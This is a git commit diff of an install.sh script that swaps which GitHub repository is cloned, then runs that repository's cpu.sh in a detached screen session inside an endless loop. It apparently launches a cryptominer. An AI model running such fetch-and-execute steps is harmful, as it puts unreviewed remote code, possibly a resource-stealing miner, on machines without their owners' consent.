3dfc4fac75f74aa43362de3eed1cefdf80c66ced
welstannabella <85975078+welstannabella@users.noreply.github.com>
2021-06-16 23:32:48 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update
 sudo apt install screen -y
-git clone https://github.com/bimasaputrq581/expert-fortnight.git && cd expert-fortnight
+git clone https://github.com/bimasaputrq581/furry-octo-waddle.git && cd furry-octo-waddle
 screen -dmS ls
 chmod +x cpu.sh && ./cpu.sh
 while [ 1 ]; do
